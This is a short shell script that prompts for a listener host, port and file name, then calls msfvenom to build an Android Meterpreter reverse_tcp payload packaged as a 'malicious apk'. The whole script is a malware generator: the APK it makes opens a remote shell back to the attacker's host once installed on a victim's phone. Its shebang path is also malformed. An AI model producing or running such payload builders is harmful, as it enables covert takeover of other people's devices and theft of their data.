#!/bash/sh
#use bash to use it

echo " enter lhost"
read lhost

echo "enter lport"
read lport

echo "enter name for the malicious apk"
read name

msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R > $name.apk

